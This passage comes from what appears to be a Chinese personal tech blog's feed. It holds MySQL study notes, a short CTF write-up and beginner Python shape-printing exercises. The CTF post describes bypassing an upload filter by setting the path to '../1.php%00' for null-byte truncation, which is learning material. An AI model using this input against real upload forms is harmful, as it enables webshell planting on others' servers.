*</code>表示查询表的所有列，使用<code>SELECT 列1, 列2, 列3</code>可以返回指定列，这种操作称为投影</p><p><strong>in语句:单独查询某些数据</strong></p><p>单独查询id=2 id=4的数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> students <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span> (<span class="number">2</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/09/5c5ee899900ff.png" alt="深度截图_选择区域_20190209224951.png"></p><p><strong>between语法：（表示该字段的值在给定的两个值之间，含该俩值）</strong></p><p>查询id=2到id=4的值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> students <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">between</span> <span class="number">2</span> <span class="keyword">and</span> <span class="number">4</span>;</span><br></pre></td></tr></table></figure><p><strong>Like：模糊查询</strong></p><p>字段名 like ‘要查询的字符’;     如果是直接写字符，配置查询字符必须一致。</p><p>字段名 like ‘%要查询的字符%’;   %是匹配任何与之相似的字符</p><p>顾名思义 like=’像‘</p><p>可能有点难理解这里我创建了几条类似的数据</p><p><img src="https://i.loli.net/2019/02/09/5c5eef34b2686.png" alt="深度截图_选择区域_20190209231800.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> students <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">like</span> <span class="string">'%大佬%'</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/09/5c5eef6b3bd32.png" alt="深度截图_选择区域_20190209231901.png"></p><p>这样子应该会更好理解</p><h3 id="distinct-去重"><a href="#distinct-去重" class="headerlink" title="distinct(去重)"></a>distinct(去重)</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> 字段 <span class="keyword">from</span> 表名;</span><br></pre></td></tr></table></figure><p>显示去重后的结果 distinct 必须跟在select后面</p><h2 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h2><p>使用<code>group by</code> 对查询结果分组</p><p>如果对数据进行分组统计就需要使用<code>group by</code> </p><p><code>group by</code>将表按列值进行分组 列的值相同为一组</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT class_id, COUNT(*) num <span class="keyword">FROM</span> students<span class="built_in"> GROUP </span>BY class_id;</span><br></pre></td></tr></table></figure><p> <img src="/2019/02/12/MySql笔记/imgs/5d36c2af4b8f179182.png" alt="QQ截图20190723161738.png"></p><p>一目了然地看出各个班级的学生人数</p><h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p><code>order by</code> 进行排序</p><p><code>order by</code> 默认是升序排列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>,  score <span class="keyword">FROM</span> students <span class="keyword">ORDER</span> <span class="keyword">BY</span> score;//成绩从低到高排列</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/23/5d36c3f1484b742654.png" alt="QQ截图20190723162215.png"></p><p>那么如何进行倒序排列</p><p><code>desc</code>表示倒序</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, gender, score <span class="keyword">FROM</span> students <span class="keyword">ORDER</span> <span class="keyword">BY</span> score <span class="keyword">DESC</span>;//成绩从高到低排列</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/23/5d36c4b85eb1a32745.png" alt="QQ截图20190723162621.png"></p><p>使用分组查询和统计后可使用<code>HAVING</code>子句来对查询结果进行进一步的刷选</p><p>一般情况下我们都是用<code>where</code></p><p>但是分组后<code>where</code>使用较少而是用<code>HAVING</code>来代替</p><p>更细节的东西看廖雪峰老师的博客<a href="https://www.liaoxuefeng.com/wiki/1177760294764384/1181753232323168" target="_blank" rel="noopener">排序</a></p><h2 id="使用limit限定结果行数"><a href="#使用limit限定结果行数" class="headerlink" title="使用limit限定结果行数"></a>使用limit限定结果行数</h2><p>limit后面可以跟两个参数，第一个参数是开始的索引号，默认是0开始，第二个参数取的个数（长度）</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">FROM</span> student <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">3</span>;//从第0行开始返回三条记录</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/23/5d36c9e10836588403.png" alt="QQ截图20190723164822.png"></p><p>还可以使用<code>offset(偏移)</code></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> student <span class="keyword">limit</span> <span class="number">3</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>从第0行开始返回三条记录</p><h2 id="常见的sql统计函数"><a href="#常见的sql统计函数" class="headerlink" title="常见的sql统计函数"></a>常见的sql统计函数</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">聚合函数(较常用)</span><br><span class="line">    <span class="built_in">count</span>(*) 统计数量  </span><br><span class="line">    <span class="built_in">max</span>(字段名)最大值</span><br><span class="line">    <span class="built_in">min</span>(字段名)最小值</span><br><span class="line">    <span class="built_in">sum</span>(字段名)求和</span><br><span class="line">    avg(字段名)求平均值</span><br><span class="line">运算函数</span><br><span class="line">    <span class="built_in">abs</span>(x)返回x的绝对值</span><br><span class="line">    <span class="built_in">floor</span>(x) 返回小于x的最大整数值</span><br><span class="line">    <span class="built_in">round</span>(x,y) 返回参数x的四舍五入的有y位小数的值</span><br><span class="line">    <span class="built_in">mod</span>(x,y) 返回x/y的模</span><br><span class="line">    greatest(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>) 返回集合中最大的值</span><br><span class="line">    least(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>)返回集合中最小的值</span><br><span class="line">字符串函数</span><br><span class="line"><span class="built_in">trim</span>(str) 去除字符串两端的空格</span><br><span class="line"><span class="built_in">upper</span>(str) 字符串转大写</span><br></pre></td></tr></table></figure><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><p>修改账号密码</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Dos命令下修改账号密码</span><br><span class="line">mysqladmin -u root -p password <span class="number">1234</span> <span class="comment">//修改root的密码为1234</span></span><br><span class="line">mysql命令修改账号密码</span><br><span class="line"><span class="keyword">set</span> password <span class="comment">fro</span> <span class="comment">'root'</span><span class="comment">@</span><span class="comment">'localhost'</span><span class="comment"> = password(</span><span class="comment">'1234'</span><span class="comment">)</span></span><br></pre></td></tr></table></figure><p>创建用户</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">'username'</span>@<span class="string">'host'</span><span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'password'</span>;</span><br></pre></td></tr></table></figure><p><code>username</code>表示要创建的用户名。</p><p><code>host</code>指定该用户在哪个主机上可以登陆，本地用户直接写<code>localhost</code>如果想让该用户任意远程主机登陆 可以使用%。</p><p><code>password</code>表示该用户的登陆密码</p><p>删除用户</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">'username'</span>@<span class="string">'host'</span>;</span><br></pre></td></tr></table></figure><h2 id="字段类型"><a href="#字段类型" class="headerlink" title="字段类型"></a>字段类型</h2><p>字符串型</p><p><img src="https://i.loli.net/2019/10/27/qso7rewPc6VaSb4.png" alt="QQ图片20191027084527.png"></p><p>整数型</p><p><img src="https://i.loli.net/2019/10/27/Xj6WvqwAEfrNezp.png" alt="QQ截图20191027084640.png"></p><p>浮点型</p><p><img src="https://i.loli.net/2019/10/27/dYbInXaWrfs4JvV.png" alt="QQ截图20191027085047.png"></p><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><p>视图的优势在于 安全和高效</p><p><strong>创建视图</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">VIEW</span> &lt;视图名&gt; <span class="keyword">AS</span> &lt;<span class="keyword">SELECT</span>语句&gt;</span><br><span class="line">//下面写个例子 创建视图，作用是获取表 <span class="keyword">users</span> 中地址为保定的学生信息</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> p <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> address=<span class="string">"保定"</span>;</span><br></pre></td></tr></table></figure><p><strong>查询视图</strong></p><p>创建完成以后我们查询视图</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>  &lt;视图名&gt;;</span><br></pre></td></tr></table></figure><p><strong>删除视图</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> &lt;视图名&gt;;</span><br></pre></td></tr></table></figure><h2 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h2><p>事务用于保证数据的一致性 他有一组相关的dml语句组成该组dml语句要么全部成功执行,要么全部失败。如网上转账 就是典型的事务处理。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//开始事务</span><br><span class="line"><span class="keyword">begin</span>;</span><br><span class="line">//提交</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line">//回滚</span><br><span class="line"><span class="keyword">rollback</span>;</span><br></pre></td></tr></table></figure><p>默认情况下 输入sql语句则自动提交</p><p>如果开启了事务,就是关闭了自动提交的功能改成了输入<code>commit</code>执行提交</p><p>比如老板要给我转账</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span>;</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> money=money<span class="number">-100</span> <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'boss'</span>;</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">users</span> <span class="keyword">set</span> money=money+<span class="number">100</span> <span class="keyword">where</span> <span class="keyword">name</span> = <span class="string">'Sch0lar'</span>;</span><br><span class="line">//开启事务后 我执行修改语句 如果两条语句都没有问题 则提交</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line">//如果有一个出现问题 name回滚</span><br><span class="line"><span class="keyword">rollback</span>;</span><br></pre></td></tr></table></figure><p>因为要保证数据的一致性 必须全部成功 有一个错误则回滚</p><h2 id="存储过程的创建和调用"><a href="#存储过程的创建和调用" class="headerlink" title="存储过程的创建和调用"></a>存储过程的创建和调用</h2><p>存储过程就是存储一段代码,用来完成特定的功能</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DELIMITER <span class="comment">//</span></span><br><span class="line"> <span class="keyword">CREATE</span> <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">GetAllProducts</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   <span class="title">BEGIN</span></span></span><br><span class="line"><span class="function">   <span class="title">SELECT</span> *  <span class="title">FROM</span> <span class="title">products</span>;</span><span class="comment">//存储过程主体</span></span><br><span class="line">   <span class="keyword">END</span> <span class="comment">//</span></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure><p>第一个命令是<code>DELIMITER //</code>，它与存储过程语法无关。 <code>DELIMITER</code>语句将标准分隔符 - 分号(<code>;</code>)更改为：<code>//</code>。 在这种情况下，分隔符从分号(<code>;</code>)更改为双斜杠<code>//</code>。为什么我们必须更改分隔符？ 因为我们想将存储过程作为整体传递给服务器，而不是让mysql工具一次解释每个语句。 在<code>END</code>关键字之后，使用分隔符<code>//</code>来指示存储过程的结束。 最后一个命令(<code>DELIMITER;</code>)将分隔符更改回分号(<code>;</code>)。</p><p><strong>GetAllProducts() 存储名</strong></p><p><strong>调用存储过程 </strong></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CALL</span> GetAllProducts<span class="comment">()</span>;<span class="comment">//GetAllProducts()是存储名</span></span><br></pre></td></tr></table></figure><p><strong>删除</strong></p><figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP <span class="function"><span class="keyword">PROCEDURE</span> <span class="title">GetAllProducts</span><span class="params">()</span>；<span class="comment">//GetAllProducts()是存储名</span></span></span><br></pre></td></tr></table></figure><h2 id="数据库备份"><a href="#数据库备份" class="headerlink" title="数据库备份"></a>数据库备份</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u root -<span class="selector-tag">p</span> xss &gt; d:/test/test.sql</span><br><span class="line">备份xss数据库到 d盘下test目录</span><br></pre></td></tr></table></figure><p><strong>还原数据库</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先建立你要还原的数据库</span></span><br><span class="line">create database xss;</span><br><span class="line"><span class="comment">//使用这个数据库</span></span><br><span class="line"><span class="keyword">use</span> xss;</span><br><span class="line"><span class="comment">//导入备份文件</span></span><br><span class="line">source <span class="keyword">d</span>:/<span class="keyword">test</span>/<span class="keyword">test</span>.sql;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>边学边记录 虽然可能效率会比较低 但是印象会很深 等以后忘了还可以回头看看 </p><p>把大佬们当做目标 肝起来</p>]]></content>
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>常见的突破上传姿势</title>
      <link href="/2018/12/27/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AA%81%E7%A0%B4%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF/"/>
      <url>/2018/12/27/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AA%81%E7%A0%B4%E4%B8%8A%E4%BC%A0%E5%A7%BF%E5%8A%BF/</url>
      <content type="html"><![CDATA[<p>突破上传的姿势 在几个月前一个实战过程中登录后台有上传却无法 getshell 当时是懵逼的  但是自己并没有当回事 也没有深入理解 之后在打ctf的过程中 一道上传题 就是用到了这姿势 今天闲的蛋疼 练习ctf又遇到 才想起来要总结总结呀！！</p><p><img src="/2018/12/27/常见的突破上传姿势/1.jpg" alt=""></p><a id="more"></a><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>这里拿一道ctf题举例</p><p><img src="/2018/12/27/常见的突破上传姿势/2.jpg" alt=""></p><h3 id="上传突破"><a href="#上传突破" class="headerlink" title="上传突破"></a>上传突破</h3><p>写文件需要路径 就是目录+文件名 </p><p>filepath+filenme</p><p>现在我们把filepath改成  ../1.php%00，%00后的那部分iflenname被截断了，后端则会认为../是目录 1.php是文件名 成功突破拿到flag</p><p><img src="/2018/12/27/常见的突破上传姿势/3.jpg" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>依旧的是特别水的文章 不过也记录了自己学习的过程 几年后成为大佬来看这些文章回忆青春 哈哈哈 扯远了 现在的问题还是学习效率低 继续加油！！</p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python打印各种图形</title>
      <link href="/2018/12/22/Python%E6%89%93%E5%8D%B0%E5%90%84%E7%A7%8D%E5%9B%BE%E5%BD%A2/"/>
      <url>/2018/12/22/Python%E6%89%93%E5%8D%B0%E5%90%84%E7%A7%8D%E5%9B%BE%E5%BD%A2/</url>
      <content type="html"><![CDATA[<p>看国光哥的博客发现他发了一篇c语言打印各种图形 然后自己最近在学python发现这是</p><p>很锻炼萌新思维的一些题 然后就想用python写一下总结的时候发现循环这一块理解的并不是很到位</p><p><img src="/2018/12/22/Python打印各种图形/0.jpg" alt=""></p><a id="more"></a><h3 id="直角三角形"><a href="#直角三角形" class="headerlink" title="直角三角形"></a>直角三角形</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">10</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(i+<span class="number">1</span>):</span><br><span class="line">print(<span class="string">'*'</span>,<span class="keyword">end</span>=<span class="string">" "</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/1.jpg" alt=""></p><h3 id="直角三角形旋转90°"><a href="#直角三角形旋转90°" class="headerlink" title="直角三角形旋转90°"></a>直角三角形旋转90°</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">10</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(i-<span class="number">1</span>):</span><br><span class="line">print(<span class="string">'*'</span>,<span class="keyword">end</span>=<span class="string">" "</span>)</span><br><span class="line">print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/2.jpg" alt=""></p><h3 id="直角三角形旋转180°"><a href="#直角三角形旋转180°" class="headerlink" title="直角三角形旋转180°"></a>直角三角形旋转180°</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,10):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(1,i):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">" "</span>,<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(10,i,-1):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"*"</span>,<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    <span class="builtin-name">print</span>()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/3.jpg" alt=""></p><h3 id="直角三角形旋转270°"><a href="#直角三角形旋转270°" class="headerlink" title="直角三角形旋转270°"></a>直角三角形旋转270°</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,10):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(9,i,-1):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">" "</span>,<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(1,i):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"*"</span>,<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    <span class="builtin-name">print</span>()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/4.jpg" alt=""></p><h3 id="等腰三角形"><a href="#等腰三角形" class="headerlink" title="等腰三角形"></a>等腰三角形</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(0, 10 - i):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(10 - i, 10):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"*"</span>, <span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">""</span>)</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/5.jpg" alt=""></p><h3 id="等腰三角形旋转90°"><a href="#等腰三角形旋转90°" class="headerlink" title="等腰三角形旋转90°"></a>等腰三角形旋转90°</h3><p>这里用的是用的直角三角形和选择转90°的直角三角形</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">0</span>, i):</span><br><span class="line">        print(<span class="string">'*'</span>,<span class="keyword">end</span>=<span class="string">" "</span>)</span><br><span class="line">    print()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">10</span>, i,-<span class="number">1</span>):</span><br><span class="line">        print(<span class="string">'*'</span>,<span class="keyword">end</span>=<span class="string">" "</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/6.jpg" alt=""></p><h3 id="等腰三角形旋转180°"><a href="#等腰三角形旋转180°" class="headerlink" title="等腰三角形旋转180°"></a>等腰三角形旋转180°</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(0,i):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(0, 10-i):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"*"</span>, <span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">""</span>)</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/7.jpg" alt=""></p><h3 id="等腰三角形旋转270"><a href="#等腰三角形旋转270" class="headerlink" title="等腰三角形旋转270"></a>等腰三角形旋转270</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(9,i,-1):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">" "</span>,<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(0, i):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"*"</span>,<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="builtin-name">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(0,i):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">" "</span>,<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(9, i,-1):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"*"</span>,<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="builtin-name">print</span>()</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/8.jpg" alt=""></p><h3 id="菱形"><a href="#菱形" class="headerlink" title="菱形"></a>菱形</h3><p>原等腰三角形和旋转180°的等腰三角形加在一起即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(0, 10 - i):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(10 - i, 10):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"*"</span>, <span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(0,i):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(0, 10-i):</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">"*"</span>, <span class="attribute">end</span>=<span class="string">" "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">""</span>)</span><br></pre></td></tr></table></figure><p><img src="/2018/12/22/Python打印各种图形/9.jpg" alt=""></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过打印以上各种图形 感觉对for的理解更深刻了 明天会更好 真好</p>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python字符串方法总结</title>
      <link href="/2018/12/18/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
      <url>/2018/12/18/Python%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
